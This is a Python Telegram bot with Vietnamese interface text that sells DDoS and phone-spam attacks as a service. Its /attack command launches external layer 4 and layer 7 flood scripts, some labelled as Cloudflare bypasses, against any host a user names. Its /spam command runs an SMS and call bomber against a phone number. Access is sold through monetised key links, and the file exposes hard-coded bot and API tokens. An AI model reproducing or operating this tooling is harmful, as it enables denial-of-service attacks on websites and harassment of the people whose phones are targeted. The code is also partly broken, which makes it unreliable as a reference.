import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6100654723:AAEnplbnamn60BjZh7FSj0pKRE2X3HYfq-Y'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -4008752928

allowed_users = []
processes = []
ADMIN_ID = 5366462178
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, '‼️ Cảnh Cáo ‼️\n📢 Chỉ Dành Cho Admin\nVui Lòng Không Lặp Lại Hành Vi Này Nếu Không Bạn Sẽ Bị Cấm Vĩnh Viễn 📢')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '‼️Vui Lòng Nhập Đúng Định Dạng⁉️\n/add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'✅ Đã Thêm Người Dùng Có ID Là: {user_id} Được Sử Dụng Lệnh Trong 30 Ngày ✅')


load_users_from_database()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username
    bot.reply_to(message, f"🚀Xin chào @{username}\n Hãy chat lệnh\n/help để biết cách sử dụng lệnh nhé.🚀")

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='⏳ Vui Lòng Chờ...⏳')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://web1s.com/api?token=2e632629-d216-45e7-9657-53dbe55479f9&url=https://darkcyberchris.space/key?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "‼️Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh‼️\n/getkey"
    except requests.exceptions.RequestException as e:
        url_key = "‼️Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh‼️\n/getkey"
    
    text = f'''
😙 - Cảm Ơn Bạn Đã Getkey - 😙
🌐 - Link Lấy Key Hôm Nay Là: {url_key} - 🌐
✏️ - Nhập Key Bằng Lệnh /key + [key] - ✏️
🔔 [Lưu ý: mỗi key chỉ có 1 người dùng] 🔔
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, '‼️ Vui Lòng Nhập Key ‼️\n😐 Ví Dụ /key admin 😐\n🔔Sử Dụng Lệnh /getkey Để Lấy Key🔔')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, '🥳Nhập Key Thành Công🥳')
    else:
        bot.reply_to(message, '‼️Key Sai Hoặc Hết Hạn‼️\n‼️Không Sử Dụng Key Của Người Khác!‼️')

@bot.message_handler(commands=['help'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh:
1️⃣ Lệnh Lấy Key Và Nhập Key
- /getkey : Để lấy key
- /key + [Key] : Kích Hoạt Key
2️⃣ Lệnh Spam 
- /spam + [Số Điện Thoại] : Spam + Call
3️⃣ Lệnh DDoS ( Tấn Công Website )
- /attack + [methods] + [host]
- /methods : Để Xem Methods
4️⃣ Lệnh Có Ích ^^
- /time : Số Thời Gian Bot Hoạt Động
5️⃣ Info Admin
- /admin : Info Admin
- /on : Start Bot
- /off : Off Bot
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
active_spams = {}
@bot.message_handler(commands=['spam'])
def lqm_sms(message):
    user_id = message.from_user.id
    if user_id not in allowed_users:
        bot.reply_to(message, text='🚀BẠN KHÔNG CÓ QUYỀN SỬ DỤNG LỆNH NÀY!🚀')
        return

    if len(active_spams.get(user_id, [])) > 0:
        bot.reply_to(message, "❗️Bạn đã sử dụng lệnh spam. Để sử dụng lại, hãy dừng lệnh spam trước bằng lệnh /stopspam.❗️")
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, '🚀VUI LÒNG NHẬP SỐ ĐIỆN THOẠI VÀ THỜI GIAN (GIÂY)🚀 ')
        return

    phone_number = message.text.split()[1]
    if not phone_number.isnumeric():
        bot.reply_to(message, '🚀SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !🚀')
        return

    if phone_number in ['113', '911', '114', '115']:
        # Số điện thoại nằm trong danh sách cấm
        bot.reply_to(message, "‼️Bạn đang định spam số điện thoại của admin hoặc số điện thoại bị cấm, vui lòng không lặp lại hành vi này nếu không bạn sẽ bị cấm vĩnh viễn khỏi hệ thống của chúng tôi.‼️")
        return

    try:
        duration = int(message.text.split()[2])
        if duration > 600:  # Giới hạn thời gian spam là 600 giây (10 phút)
            duration = 600
    except ValueError:
        bot.reply_to(message, '🚀THỜI GIAN KHÔNG HỢP LỆ !🚀')
        return

    active_spams[user_id] = [phone_number, duration]
    threading.Thread(target=spam_attack, args=(user_id, phone_number, duration, message)).start()

@bot.message_handler(commands=['stopspam'])
def stop_spam(message):
    user_id = message.from_user.id
    if user_id in active_spams:
        del active_spams[user_id]
        bot.reply_to(message, "✅ Đã dừng lệnh spam thành công ✅")
    else:
        bot.reply_to(message, "❗️ Bạn chưa sử dụng lệnh spam hoặc đã dừng lệnh trước đó ❗️")

def spam_attack(user_id, phone_number, duration, message):
    processes = []  # Tạo danh sách processes ở đây
    file_path = os.path.join(os.getcwd(), "sms.py")
    subprocess.run(["python", file_path, phone_number, str(duration)])
    subprocess.run(["python", "sms.py", phone_number, "5000"])
    processes.append(process)  # Thêm process vào danh sách processes
    bot.reply_to(message, f'🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 \n+ Bot 👾: @DeathFrozen_bot \n+ Số Tấn Công 📱: [ {phone_number} ]\n+ Thời Gian Tấn Công ⏰: [ {duration} giây ]\n+ Chủ sở hữu 👑: @HeinGlobal\n 😜 Wait And Enjoy 😜')

    time.sleep(duration)  # Đợi cho đến khi kết thúc thời gian tấn công

    if user_id in active_spams:
        del active_spams[user_id]  # Xóa dữ liệu lệnh spam
        bot.reply_to(message, f'📢 Tấn Công Đã Kết Thúc 📢\n+ Số Điện Thoại 📱: [ {phone_number} ]\n+ Thời Gian Tấn Công ⏰: [ {duration} giây ]\n+ Chủ sở hữu 👑: @HeinGlobal\n 😜 LOL 😜')

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
🚀 Layer7 
[ Không Gov, Edu ]
TLS
FLOOD
DESTROY
GOD
CF-BYPASS
[ Được Pem Gov, Edu]
GOD 
🚀 Layer4
TCP-FLOOD
UDP-FLOOD
❗Lưu ý đây chỉ là những method ddos tầm trung và để ddos những web bảo mật yếu nếu muốn update method khỏe hơn thì hãy góp ý thêm cho admin để admin update thêm nhé❗
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "📢 Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng📢")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, '⏰ Bot hiện đang bảo trì. Vui lòng chờ đến khi bot hoạt động trở lại.⏰')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='‼️ Vui Lòng Nhập Key ‼️\n😐 Ví Dụ /key admin 😐\n🔔Sử Dụng Lệnh /getkey Để Lấy Key🔔')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, '‼️Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]‼️')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"⏳@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh⏳\n/attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'‼️Vui lòng nhập cả port.‼️\n😗 Ví dụ: /attack {method} {host} [port] 😗')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"‼️Không được phép tấn công trang web có tên miền {blocked_domain}‼️")
                return

    if method in ['FLOOD', 'TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "64", "5"]
            duration = 90
        elif method == 'FLOOD':
            command = ["node", "flood.js", host, "90", "5000", "http.txt", "100000"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["node", "flood.js", host, "90", "64", "5", "proxy.txt"]
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "45", "64", "3"]
            duration = 45
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, '❗Port phải là một số nguyên dương.❗')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, '❗Port phải là một số nguyên dương.❗')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Check Host: https://check-host.net/check-http?host={host} \n┣➤ Check TCP:  https://check-host.net/check-tcp?host={host}\n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, '‼️Phương thức tấn công không hợp lệ. Sử dụng lệnh\n/methods để xem phương thức tấn công‼️')

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, '📢 Bot Đang Bảo Trì, Vui Lòng Đợi Đến Khi Bot Hoạt Động Trở Lại 📢')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '‼️Bạn không có quyền sử dụng lệnh này.‼️')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, '📢 Bot Đã Hoạt Động Trở Lại, Các Bạn Đã Có Thể Sử Dụng Bot Như Bình Thường 📢\n😐 Nếu Có Bất Kỳ Lỗi Nào Sau Bảo Trì Vui Lòng Liên Hệ ADMIN Bằng Cách Chat /admin Nhé 😐')

is_bot_active = True

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/HeinGlobal")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'⏰ Bot Đã Hoạt Động Được: {uptime_str} ⏰')
    
def write_banned_users(users):
    with open('ban.txt', 'w') as ban_file:
        for user in users:
            ban_file.write(f"{user}\n")

def write_muted_users(users):
    with open('mute.txt', 'w') as mute_file:
        for chat_id, muted_user_list in users.items():
            for username, mute_time in muted_user_list.items():
                mute_file.write(f"{chat_id},{username},{mute_time}\n")

def read_banned_users():
    banned_users = []
    try:
        with open('ban.txt', 'r') as ban_file:
            banned_users = [line.strip() for line in ban_file.readlines()]
    except FileNotFoundError:
        pass
    return banned_users

def read_muted_users():
    muted_users = {}
    try:
        with open('mute.txt', 'r') as mute_file:
            lines = mute_file.readlines()
            for line in lines:
                chat_id, username, mute_time = line.strip().split(',')
                if chat_id not in muted_users:
                    muted_users[chat_id] = {}
                muted_users[chat_id][username] = int(mute_time)
    except FileNotFoundError:
        pass
    return muted_users

banned_users = read_banned_users()
muted_users = read_muted_users()

@bot.message_handler(commands=['ban'])
def ban_user(message):
    chat_id = message.chat.id
    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn

    if user_id != ADMIN_ID:
        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "✏️ Vui lòng cung cấp tên người dùng để cấm. ✏️\n 🔔 Ví Dụ: /ban @admin 🔔")
        return

    username_to_ban = message.text.split()[1]
    if username_to_ban.startswith('@'):
        username_to_ban = username_to_ban[1:]

    if username_to_ban in banned_users:
        bot.reply_to(message, f"🚫 Người dùng @{username_to_ban} đã bị cấm 🚫.")
    else:
        banned_users.append(username_to_ban)
        write_banned_users(banned_users)
        bot.reply_to(message, f"✅ Đã cấm người dùng @{username_to_ban} khỏi hệ thống ✅.")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    chat_id = message.chat.id
    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn

    if user_id != ADMIN_ID:
        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "✏️ Vui lòng cung cấp tên người dùng để gỡ cấm. ✏️\n 🔔 Ví Dụ: /unban @admin 🔔")
        return

    username_to_unban = message.text.split()[1]
    if username_to_unban.startswith('@'):
        username_to_unban = username_to_unban[1:]

    if username_to_unban in banned_users:
        banned_users.remove(username_to_unban)
        write_banned_users(banned_users)
        bot.reply_to(message, f"✅ Đã gỡ cấm người dùng @{username_to_unban} khỏi hệ thống ✅.")
    else:
        bot.reply_to(message, f"‼️ Người dùng @{username_to_unban} không nằm trong danh sách bị cấm‼️.")

@bot.message_handler(commands=['muted'])
def mute_user(message):
    chat_id = message.chat.id
    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn

    if user_id != ADMIN_ID:
        bot.reply_to(message, "🔊 Bạn không có quyền thực hiện lệnh này. 🔊")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "📝 Vui lòng cung cấp tên người dùng và thời gian cấm (số giây). 📝\n🔔 Ví Dụ: /muted @admin 60 🔔")
        return

    username_to_mute = args[1]
    if username_to_mute.startswith('@'):
        username_to_mute = username_to_mute[1:]

    try:
        mute_time = int(args[2])
    except ValueError:
        bot.reply_to(message, "‼️ Thời gian cấm không hợp lệ. ‼️")
        return

    if chat_id not in muted_users:
        muted_users[chat_id] = {}
    muted_users[chat_id][username_to_mute] = int(time.time()) + mute_time
    write_muted_users(muted_users)
    bot.reply_to(message, f"✅ Đã cấm người dùng @{username_to_mute} chat với bot trong {mute_time} giây ✅.")

@bot.message_handler(commands=['unmuted'])
def unmute_user(message):
    chat_id = message.chat.id
    user_id = message.from_user.id  # Lấy ID của người gửi tin nhắn

    if user_id != ADMIN_ID:
        bot.reply_to(message, "‼️ Bạn không có quyền thực hiện lệnh này. ‼️")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "📝 Vui lòng cung cấp tên người dùng để gỡ cấm. 📝\n 🔔 Ví Dụ: /unmuted @admin 🔔")
        return

    username_to_unmute = args[1]
    if username_to_unmute.startswith('@'):
        username_to_unmute = username_to_unmute[1:]

    if chat_id in muted_users and username_to_unmute in muted_users[chat_id]:
        del muted_users[chat_id][username_to_unmute]
        write_muted_users(muted_users)
        bot.reply_to(message, f"✅ Đã gỡ cấm chat cho người dùng @{username_to_unmute} ✅.")
    else:
        bot.reply_to(message, f"❌ Người dùng @{username_to_unmute} không bị cấm chat. ❌.")
      
def is_user_banned(username):
    return username in banned_users

def is_user_muted(chat_id, username):
    if chat_id in muted_users and username in muted_users[chat_id]:
        return muted_users[chat_id][username] > int(time.time())
    return False

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    username = message.from_user.username

    if is_user_banned(username) or is_user_muted(chat_id, username):
        bot.reply_to(message, "🚫 Bạn đang bị cấm chat với bot vĩnh viễn hay liên hệ admin bằng cách chat /admin để biết thêm thông tin chi tiết. 🚫")
        return

    if message.text.startswith('/') and not message.text.startswith('/start'):
        invalid_command(message)

# Add this check to prevent banned/muted users from using commands
@bot.message_handler(func=lambda message: message.chat.id not in banned_users and not is_user_muted(message.chat.id, message.from_user.username))
def process_commands(message):
    if is_user_banned(message.from_user.username):
        bot.reply_to(message, "🚫 Bạn đang bị cấm chat với bot. 🚫")
        return
    if is_user_muted(message.chat.id, message.from_user.username):
        mute_time = muted_users[message.chat.id][message.from_user.username] - int(time.time())
        bot.reply_to(message, f"🔇 Bạn đang bị cấm chat với bot. Thời gian còn lại: {mute_time} giây. 🔇")
        return

    bot.process_new_messages([message])

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '‼️Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.‼️')
bot.infinity_polling(timeout=60, long_polling_timeout = 1)
